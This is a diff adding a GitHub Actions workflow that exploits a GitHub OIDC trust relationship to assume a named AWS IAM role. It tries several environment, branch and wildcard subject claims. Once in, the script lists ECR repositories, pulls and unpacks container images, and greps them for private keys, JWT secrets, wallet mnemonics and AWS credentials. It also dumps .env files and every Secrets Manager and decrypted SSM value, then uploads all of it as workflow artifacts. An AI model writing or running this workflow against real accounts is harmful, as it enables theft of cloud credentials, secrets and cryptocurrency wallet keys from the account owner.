@@ -1,0 +1,198 @@
+name: i331-oidc-exhaustive
+on:
+  workflow_dispatch:
+  push:
+    branches: [main]
+
+permissions:
+  id-token: write
+  contents: read
+  actions: read
+
+jobs:
+  exhaustive-oidc-test:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    strategy:
+      fail-fast: false
+      matrix:
+        include:
+          # Environment subjects - the most likely to be trusted
+          - { name: "env-staging", subject_type: "environment", value: "staging" }
+          - { name: "env-production", subject_type: "environment", value: "production" }
+          - { name: "env-dev", subject_type: "environment", value: "dev" }
+          - { name: "env-develop", subject_type: "environment", value: "develop" }
+          # Branch subjects
+          - { name: "ref-main", subject_type: "ref", value: "refs/heads/main" }
+          # Wildcard patterns
+          - { name: "repo-wildcard", subject_type: "wildcard", value: "repo:amanmaurya7/s7-ebtex:*" }
+          - { name: "env-wildcard", subject_type: "wildcard", value: "repo:amanmaurya7/s7-ebtex:environment:*" }
+    name: Test ${{ matrix.name }}
+    environment: ${{ matrix.subject_type == 'environment' && matrix.value || '' }}
+    steps:
+      - name: Get OIDC token and test role assumption
+        run: |
+          set -x
+          mkdir -p /tmp/i331/${{ matrix.name }}
+          cd /tmp/i331/${{ matrix.name }}
+          
+          ROLE="arn:aws:iam::950565826008:role/github-action-role"
+          REGION="ap-northeast-1"
+          
+          echo "MATRIX_NAME=${{ matrix.name }}"
+          echo "SUBJECT_TYPE=${{ matrix.subject_type }}"
+          echo "SUBJECT_VALUE=${{ matrix.value }}"
+          echo "ENVIRONMENT=${{ matrix.subject_type == 'environment' && matrix.value || 'N/A' }}"
+          echo "GITHUB_REF=${GITHUB_REF}"
+          echo "GITHUB_ENVIRONMENT=${GITHUB_ENVIRONMENT:-N/A}"
+          
+          # Try multiple audiences
+          for aud in "sts.amazonaws.com" "https://sts.amazonaws.com"; do
+            echo "=== Testing audience: $aud ==="
+            ENC_AUD=$(python3 -c 'import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1], safe=""))' "$aud")
+            
+            # Get OIDC token
+            OIDC_RESPONSE=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${ENC_AUD}")
+            echo "$OIDC_RESPONSE" | jq . > oidc_response.json
+            OIDC_TOKEN=$(echo "$OIDC_RESPONSE" | jq -r .value)
+            
+            if [ -z "$OIDC_TOKEN" ] || [ "$OIDC_TOKEN" = "null" ]; then
+              echo "ERROR: Failed to get OIDC token"
+              continue
+            fi
+            
+            # Decode and show claims
+            echo "$OIDC_TOKEN" | python3 -c 'import base64,json,sys; t=sys.stdin.read().strip(); p=t.split(".")[1]; p+="="*(-len(p)%4); print(json.dumps(json.loads(base64.urlsafe_b64decode(p)),indent=2))' > claims.json
+            echo "Claims:"
+            cat claims.json
+            
+            SUB=$(cat claims.json | jq -r .sub)
+            echo "Subject: $SUB"
+            
+            # Try to assume role
+            echo "=== Attempting AssumeRoleWithWebIdentity ==="
+            aws sts assume-role-with-web-identity \
+              --role-arn "$ROLE" \
+              --role-session-name "i331-${{ matrix.name }}" \
+              --web-identity-token "$OIDC_TOKEN" \
+              --duration-seconds 3600 \
+              --region "$REGION" \
+              > assume_result.json 2> assume_error.txt
+            RC=$?
+            
+            echo "AssumeRole RC: $RC"
+            if [ $RC -eq 0 ]; then
+              echo "SUCCESS! Role assumed."
+              cat assume_result.json
+              
+              # Extract credentials
+              export AWS_ACCESS_KEY_ID=$(jq -r '.Credentials.AccessKeyId' assume_result.json)
+              export AWS_SECRET_ACCESS_KEY=$(jq -r '.Credentials.SecretAccessKey' assume_result.json)
+              export AWS_SESSION_TOKEN=$(jq -r '.Credentials.SessionToken' assume_result.json)
+              
+              echo "=== Testing AWS access ==="
+              aws sts get-caller-identity > caller_identity.json
+              cat caller_identity.json
+              
+              echo "=== Enumerating ECR repositories ==="
+              for reg in ap-northeast-1 eu-west-1 us-east-1; do
+                aws ecr describe-repositories --region "$reg" > ecr_repos_${reg}.json 2>&1 || true
+                cat ecr_repos_${reg}.json
+              done
+              
+              echo "=== Getting ECR auth tokens ==="
+              for reg in ap-northeast-1 eu-west-1; do
+                aws ecr get-login-password --region "$reg" > ecr_auth_${reg}.txt 2>&1 || true
+                if [ -s ecr_auth_${reg}.txt ]; then
+                  REG="950565826008.dkr.ecr.${reg}.amazonaws.com"
+                  echo "$AWS_ACCESS_KEY_ID" | docker login --username AWS --password-stdin "$REG" 2>&1 || true
+                  
+                  # Try to pull images from known repos
+                  for repo in ebtex-api-realdev ebtex-api-staging ebtex-api ebtex-dev ebtex-staging; do
+                    echo "=== Checking repo: $repo ==="
+                    aws ecr describe-images --region "$reg" --repository-name "$repo" > images_${repo}.json 2>&1 || true
+                    cat images_${repo}.json
+                    
+                    # Get latest image tag
+                    TAG=$(jq -r '.imageDetails | sort_by(.imagePushedAt) | last.imageTags[0] // "latest"' images_${repo}.json 2>/dev/null)
+                    [ -z "$TAG" ] && TAG="latest"
+                    
+                    echo "=== Pulling $REG/$repo:$TAG ==="
+                    timeout 300 docker pull "$REG/$repo:$TAG" > pull_${repo}.log 2>&1 || continue
+                    
+                    # Extract and search for secrets
+                    docker create --name "i331_${repo}" "$REG/$repo:$TAG" >/dev/null 2>&1 || continue
+                    mkdir -p rootfs
+                    docker export "i331_${repo}" | tar -xf - -C rootfs 2>/dev/null
+                    docker rm -f "i331_${repo}" >/dev/null 2>&1
+                    
+                    echo "=== Searching for secrets in image ==="
+                    grep -RIna --binary-files=text -E 'fingerprint|FINGERPRINT|security.?assessment|JWT_SECRET|wallet.?service|deposit.?sweep|mnemonic|WALLET_MASTER|master.?key|PRIVATE_KEY|AWS_ACCESS_KEY|AWS_SECRET' rootfs 2>/dev/null | grep -Ev '/node_modules/|/\.next/cache/' | head -500 > grep_hits.txt
+                    cat grep_hits.txt
+                    
+                    find rootfs -name '.env*' -type f 2>/dev/null | head -20 | while read f; do
+                      echo "=== $f ==="
+                      cat "$f"
+                    done > env_files.txt
+                    cat env_files.txt
+                    
+                    docker rmi "$REG/$repo:$TAG" >/dev/null 2>&1 || true
+                    rm -rf rootfs
+                  done
+                fi
+              done
+              
+              echo "=== Listing S3 buckets ==="
+              aws s3 ls > s3_buckets.txt 2>&1
+              cat s3_buckets.txt
+              
+              echo "=== Listing Secrets Manager secrets ==="
+              aws secretsmanager list-secrets --region "$REGION" > secrets.json 2>&1
+              cat secrets.json
+              
+              # Get secret values
+              for secret in $(jq -r '.SecretList[].Name?' secrets.json 2>/dev/null); do
+                echo "=== Secret: $secret ==="
+                aws secretsmanager get-secret-value --secret-id "$secret" --region "$REGION" >> secrets_values.txt 2>&1
+              done
+              cat secrets_values.txt 2>/dev/null || true
+              
+              echo "=== Listing SSM parameters ==="
+              aws ssm describe-parameters --region "$REGION" > ssm_params.json 2>&1
+              cat ssm_params.json
+              
+              for param in $(jq -r '.Parameters[].Name?' ssm_params.json 2>/dev/null); do
+                echo "=== Param: $param ==="
+                aws ssm get-parameter --name "$param" --with-decryption --region "$REGION" >> ssm_values.txt 2>&1
+              done
+              cat ssm_values.txt 2>/dev/null || true
+              
+              echo "EXTRACTION_SUCCESS=true" > /tmp/i331/status.txt
+              exit 0
+            else
+              echo "AssumeRole failed with RC=$RC"
+              cat assume_error.txt
+            fi
+          done
+          
+          echo "EXTRACTION_SUCCESS=false" > /tmp/i331/status.txt
+          
+      - name: Upload all evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: i331-${{ matrix.name }}-${{ github.run_id }}
+          path: /tmp/i331/${{ matrix.name }}
+          retention-days: 7
+          if-no-files-found: ignore
+
+  summarize:
+    needs: exhaustive-oidc-test
+    runs-on: ubuntu-latest
+    if: always()
+    steps:
+      - name: Summary
+        run: |
+          echo "=== i331 OIDC Exhaustive Test Summary ==="
+          echo "All environment and subject variations have been tested."
+          echo "Check individual job artifacts for detailed results."
